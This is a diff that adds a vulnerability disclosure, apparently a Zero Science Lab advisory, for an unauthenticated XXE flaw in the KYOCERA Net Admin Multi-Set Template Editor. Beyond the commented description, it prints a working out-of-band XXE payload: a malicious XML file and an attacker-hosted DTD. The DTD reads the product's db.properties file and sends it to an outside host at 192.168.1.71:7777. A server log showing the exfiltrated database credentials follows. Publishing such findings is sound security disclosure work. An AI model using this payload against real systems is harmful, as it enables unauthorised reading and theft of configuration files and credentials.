@@ -1,0 +1,62 @@
+#Vendor: KYOCERA Corporation
+#Product https://global.kyocera.com
+#Affected version: 3.4.0906
+#
+#Summary: KYOCERA Net Admin is Kyocera's unified
+#device management software that uses a web-based
+#platform to give network administrators easy and
+#uncomplicated control to handle a fleet for up to
+#10,000 devices. Tasks that used to require multiple
+#programs or walking to each printer can now be
+#accomplished in a single, fast and modern environment.
+#
+#Desc: KYOCERA Multi-Set Template Editor (part of Net
+#Admin) suffers from an unauthenticated XML External Entity
+#(XXE) injection vulnerability using the DTD parameter
+#entities technique resulting in disclosure and retrieval
+#of arbitrary data from the affected node via out-of-band
+#(OOB) channel attack. The vulnerability is triggered when
+#input passed to the Multi-Set Template Editor (kmmted.exe)
+#called by the ActiveX DLL MultisetTemplateEditorActiveXComponent.dll
+#is not sanitized while parsing a 5.x Multi-Set template XML
+#file.
+#
+#Tested on: Microsoft Windows 7 Professional SP1 (EN)
+# Apache Tomcat/8.5.15
+#
+#
+#Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience
+#                            
+#
+#
+#Advisory ID: ZSL-2018-5459
+#Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5459.php
+#
+#
+#28.03.2018
+#
+#—
+#
+#
+#Malicious.xml:
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE ZSL [
+<!ENTITY % remote SYSTEM "http://192.168.1.71:7777/xxe.xml">
+%remote;
+%root;
+%oob;]>
+
+
+Attacker's xxe.xml:
+
+<!ENTITY % fetch SYSTEM "file:///C:\Program Files\Kyocera\NetAdmin\Admin\conf\db.properties">
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://192.168.1.71:7777/?%fetch;'> ">
+
+
+Data retrieval:
+
+lqwrm@metalgear:~$ python -m SimpleHTTPServer 7777
+Serving HTTP on 0.0.0.0 port 7777 ...
+192.168.1.71 - - [01/Apr/2018 14:36:15] "GET /xxe.xml HTTP/1.1" 200 -
+192.168.1.71 - - [01/Apr/2018 14:36:15] "GET /?db_host=localhost%0D%0Adb_port=5432%0D%0Adb_name=KNETADMINDB%0D%0Adb_driver=pgsql%0D%0Adb_user=postgres%0D%0Adb_password=ENC(4YMilUUDS80QB5rD+Rhn1z89rNXQXxcw)%0D%0Adb_driverClassName=org.postgresql.Driver%0D%0Adb_url=jdbc:postgresql://localhost/KNETADMINDB%0D%0Adb_initialSize=1%0D%0Adb_maxActive=20%0D%0Adb_dialect=org.hibernate.dialect.PostgreSQLDialect HTTP/1.1" 200 -
